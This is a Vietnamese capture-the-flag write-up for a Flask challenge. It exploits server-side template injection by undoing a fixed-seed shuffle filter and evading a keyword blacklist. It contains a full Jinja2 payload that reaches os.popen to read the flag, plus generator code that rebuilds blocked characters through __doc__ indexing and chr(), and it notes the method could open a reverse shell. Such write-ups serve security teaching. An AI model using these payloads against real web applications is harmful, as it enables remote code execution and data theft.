# Magic random:

## 1. Description

- Author: ductohno

Phép thuật chưa bao giờ là con đường bằng phẳng. Chỉ khi kiên định bước qua mọi thử thách, bạn mới có thể gầy dựng nên một pháp thuật mang bản sắc riêng của chính mình.

## 2. Phân tích

Thứ nhất, ta phải xem qua source cái đã

```python
RANDOM_SEED=random.randint(0,50)

def valid_template(template):
    pattern = r"^[a-zA-Z0-9 ]+$"    
    if not re.match(pattern, template):
        random.seed(RANDOM_SEED) 
        char_list = list(template)
        random.shuffle(char_list)
        template = ''.join(char_list)
    return template

def special_filter(user_input):
    simple_filter=["flag", "*", "\"", "'", "\\", "/", ";", ":", "~", "`", "+", "=", "&", "^", "%", "$", "#", "@", "!", "\n", "|", "import", "os", "request", "attr", "sys", "builtins", "class", "subclass", "config", "json", "sessions", "self", "templat", "view", "wrapper", "test", "log", "help", "cli", "blueprints", "signals", "typing", "ctx", "mro", "base", "url", "cycler", "get", "join", "name", "g.", "lipsum", "application", "render"]
    for char_num in range(len(simple_filter)):
        if simple_filter[char_num] in user_input.lower():
            return False
    return True

@app.route("/api/cast_attack")
def cast_attack():
    attack_name = request.args.get("attack_name", "")
    if attack_name in attack_types:
        attack = attack_types[attack_name]
        return jsonify(attack)
    else:
        try:
            attack_name=valid_template(attack_name)
            if not special_filter(attack_name):
                return jsonify({"error": "Creating magic is failed"}), 404
            template=render_template_string("<i>No magic name "+attack_name+ " here, try again!</i>")    
            return jsonify({"error": template}), 404
        except Exception as e:
            return jsonify({"error": "There is something wrong here: "+str(e)}), 404
```

Dựa vào đoạn code kia, ta thấy đây là ssti bypass filter. Bài có 2 filter. Filter 1 là nếu trong input có kí tự khác chữ, số và dấu cách, nó sẽ dùng suffer để đảo ngược. Filter 2 là nếu trong payload chứa các kí tự có trongh blacklist, thì sẽ bị chặn. Chúng ta sẽ nói về từng filter một 

### 2.1. Filter 1
Filter này thì mình có mượn ý tưởng từ 1 chall năm 2024, tên là [wind](https://2024.angstromctf.com/challenges). Thực ra thì nó chỉ là random với seed cố định nhưng thay vì là 0 như bài gốc, thì mình cho server random 1 seed cố định khác. Cón random.shuffle, với 1 seed cố định thì sẽ luôn cho ta cùng 1 kết quả, bất kể có thử bao nhiêu lần đi nữa. Điều này áp dụng với cả list nữa. Mình sẽ lấy luôn hàm từ bài đó mà mình gen dc từ chatgpt. Đại khái là nó tạo 1 list, mỗi phần tử là 1 số từ 0 đến len(input) - 1 xong shuffle, từ đó tìm dc thứ tự sau khi shuffle. Dựa vào 2 list đó ta có thể hoán đổi vị trí các kí tự sao chi khi đi qua filter đầu tiên, ta có thể tạo được payload mình mong muốn

```python
def find_original_string_from_target(target_text, seed_value):
	random.seed(seed_value)
	indices = list(range(len(target_text)))
	random.shuffle(indices)
	
	original_list = [''] * len(target_text)
	for i, index in enumerate(indices):
		original_list[index] = target_text[i]
		
	original_text = ''.join(original_list)
	return original_text, indices
```

Vậy là xong vấn đề đầu tiên

### 2.2. Filter 2

Với việc bị khóa từng kia thứ, ae vẫn có thể xài `app` hoặc `__main__`

Giả sử mình xài `app`, thì target payload mình mong muốn là

```python
{{{{app.__init__.__globals__["sys"].modules["os"].popen(<MY_COMMAND>).read()}}}}
```

Nhưng, vấn đề là `'` và `"` đã bị chặn, do đó ta sẽ phải dùng các khác. ! trong các cách có thể sử dụng chính là `__doc__`. `__doc__` sẽ in ra cho ta tài liệu của module phía trước. Mình sẽ chọn `{}.__doc__` tại nó bao quát được gần hết các kí tự. 

```
dict() -> new empty dictionary
dict(mapping) -> new dictionary initialized from a mapping object's
    (key
 value) pairs
dict(iterable) -> new dictionary initialized as if via:
    d = {}
    for k
 v in iterable:
        d[k] = v
dict(**kwargs) -> new dictionary initialized with the name=value pairs
    in the keyword argument list.  For example:  dict(one=1
 two=2)
```

Vì kết quả trả ra là 1 string, ta có thể sử dụng `{}.__doc__[<chỉ số>]` để trích xuất các kí tự. Sau đó, vì `+` đã bị ban, ta có thể xài method `__add__()` để nối chúng lại với nhau. Như vậy, ta đã có thể bypass dấu `'` và `"` rồi. Lúc này ta có thể thực hiện 1 số lệnh cơ bản, chả hạn như ls.

```python
def create_magic_payload_by_chr(CMD):
	result=""
	sample=f"app.__init__.__globals__[{create_magic_payload_by_doc('sys')}].modules[{create_magic_payload_by_doc('builtins')}]"
	for i in range(len(CMD)):
		if i == 0:
			result += sample+f".chr({ord(CMD[i])}).__add__("
		elif i == len(CMD)-1:
			result += sample+f".chr({ord(CMD[i])}))"
		else:
			result += sample+f".chr({ord(CMD[i])})).__add__("
	print(f"[+] Result of {CMD}: {result}")
	return result

target_text = "{{app.__init__.__globals__["+create_magic_payload_by_doc('sys')+"].modules["+create_magic_payload_by_doc('os')+"].popen("+create_magic_payload_by_doc('ls')+").read()}}"    
print(target_text)
```

Lúc làm bài này mình ko tính đến trường hợp là thằng dict có dấu `*`, nên thành ra bài này khá dễ. Thực tế, intended của mình là muốn mọi người xài hàm buildin (ở đây là chr) để mã hóa thằng cmd, từ đó giúp ta dễ dàng làm bất cứ thứ gì, kể cả reverse shell.

Ý tưởng là 

```python
{{app.__init__.__globals__[{create_magic_payload_by_doc('sys')}].modules[{create_magic_payload_by_doc('builtins')}].chr(<1 số nào ascii nào đó>)}}
```

rồi dùng `__add__()` để nối chúng lại

## 3. Khai thác

Payload chạy lệnh `cat flag*`: (Filter 2 thôi nhé) 
```python
{{app.__init__.__globals__[{}.__doc__[97].__add__({}.__doc__[18]).__add__({}.__doc__[97])].modules[{}.__doc__[25].__add__({}.__doc__[97])].popen(app.__init__.__globals__[{}.__doc__[97].__add__({}.__doc__[18]).__add__({}.__doc__[97])].modules[{}.__doc__[91].__add__({}.__doc__[112]).__add__({}.__doc__[1]).__add__({}.__doc__[69]).__add__({}.__doc__[3]).__add__({}.__doc__[1]).__add__({}.__doc__[10]).__add__({}.__doc__[97])].chr(99).__add__(app.__init__.__globals__[{}.__doc__[97].__add__({}.__doc__[18]).__add__({}.__doc__[97])].modules[{}.__doc__[91].__add__({}.__doc__[112]).__add__({}.__doc__[1]).__add__({}.__doc__[69]).__add__({}.__doc__[3]).__add__({}.__doc__[1]).__add__({}.__doc__[10]).__add__({}.__doc__[97])].chr(97)).__add__(app.__init__.__globals__[{}.__doc__[97].__add__({}.__doc__[18]).__add__({}.__doc__[97])].modules[{}.__doc__[91].__add__({}.__doc__[112]).__add__({}.__doc__[1]).__add__({}.__doc__[69]).__add__({}.__doc__[3]).__add__({}.__doc__[1]).__add__({}.__doc__[10]).__add__({}.__doc__[97])].chr(116)).__add__(app.__init__.__globals__[{}.__doc__[97].__add__({}.__doc__[18]).__add__({}.__doc__[97])].modules[{}.__doc__[91].__add__({}.__doc__[112]).__add__({}.__doc__[1]).__add__({}.__doc__[69]).__add__({}.__doc__[3]).__add__({}.__doc__[1]).__add__({}.__doc__[10]).__add__({}.__doc__[97])].chr(32)).__add__(app.__init__.__globals__[{}.__doc__[97].__add__({}.__doc__[18]).__add__({}.__doc__[97])].modules[{}.__doc__[91].__add__({}.__doc__[112]).__add__({}.__doc__[1]).__add__({}.__doc__[69]).__add__({}.__doc__[3]).__add__({}.__doc__[1]).__add__({}.__doc__[10]).__add__({}.__doc__[97])].chr(102)).__add__(app.__init__.__globals__[{}.__doc__[97].__add__({}.__doc__[18]).__add__({}.__doc__[97])].modules[{}.__doc__[91].__add__({}.__doc__[112]).__add__({}.__doc__[1]).__add__({}.__doc__[69]).__add__({}.__doc__[3]).__add__({}.__doc__[1]).__add__({}.__doc__[10]).__add__({}.__doc__[97])].chr(108)).__add__(app.__init__.__globals__[{}.__doc__[97].__add__({}.__doc__[18]).__add__({}.__doc__[97])].modules[{}.__doc__[91].__add__({}.__doc__[112]).__add__({}.__doc__[1]).__add__({}.__doc__[69]).__add__({}.__doc__[3]).__add__({}.__doc__[1]).__add__({}.__doc__[10]).__add__({}.__doc__[97])].chr(97)).__add__(app.__init__.__globals__[{}.__doc__[97].__add__({}.__doc__[18]).__add__({}.__doc__[97])].modules[{}.__doc__[91].__add__({}.__doc__[112]).__add__({}.__doc__[1]).__add__({}.__doc__[69]).__add__({}.__doc__[3]).__add__({}.__doc__[1]).__add__({}.__doc__[10]).__add__({}.__doc__[97])].chr(103)).__add__(app.__init__.__globals__[{}.__doc__[97].__add__({}.__doc__[18]).__add__({}.__doc__[97])].modules[{}.__doc__[91].__add__({}.__doc__[112]).__add__({}.__doc__[1]).__add__({}.__doc__[69]).__add__({}.__doc__[3]).__add__({}.__doc__[1]).__add__({}.__doc__[10]).__add__({}.__doc__[97])].chr(42))).read()}}
```

Mình để script khai thác ở <a href="exploit.py">đây</a> nhé

## 4. Flag

`HOLACTF{create_your_magic_[hash]}`
